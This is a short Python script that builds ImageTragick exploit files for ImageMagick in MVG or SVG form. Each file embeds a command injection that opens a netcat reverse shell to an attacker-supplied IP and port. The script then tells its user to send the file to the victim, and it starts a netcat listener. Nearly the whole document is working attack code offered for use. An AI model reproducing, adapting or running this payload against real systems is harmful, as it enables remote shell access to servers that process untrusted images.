#!/usr/bin/env python3

import os, argparse;

def buildParser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="ImageTragick Exploit")

    group = parser.add_argument_group("File Type")
    filetypeGroup = group.add_mutually_exclusive_group(required=True)
    filetypeGroup.add_argument(
        '--mvg',
        help="MVG File",
        action="store_true"
    )
    filetypeGroup.add_argument(
        '--svg',
        help="SVG File",
        action='store_true'
    )

    parser.add_argument(
        'LHOST',
        help="Listening IP",
    )
    parser.add_argument(
        'LPORT',
        help="Listening Port"
    )

    return parser

if __name__ == '__main__':
    args = buildParser().parse_args()

    ip = args.LHOST
    port = args.LPORT

    if args.mvg:
        code = f"""push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc {ip} {port} 1>/tmp/pipez;rm -rf "/tmp/pipez)'
pop graphic-context
        """
        try:
            with open("imagik.mvg", "w") as w: w.write(code)
            print("[+] Exploit Successfully created as imagik.mvg")
        except PermissionError as e:
            print("[-]", e)
    
    if args.svg:
        code = f"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
"http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc {ip} {port} 1>/tmp/pipez;rm -rf &quot;/tmp/pipez"
x="0" y="0" height="640px" width="480px"/>
</svg>"""
        try:
            with open("imagik.svg", "w") as w: w.write(code)
            print("[+] Exploit Successfully created as imagik.svg")
        except PermissionError as e:
            print("[-]", e)

    
    print(f"[!] Send the file to the victim and wait for reverse shell {port}")
    os.system(f"nc -nlvp {port}")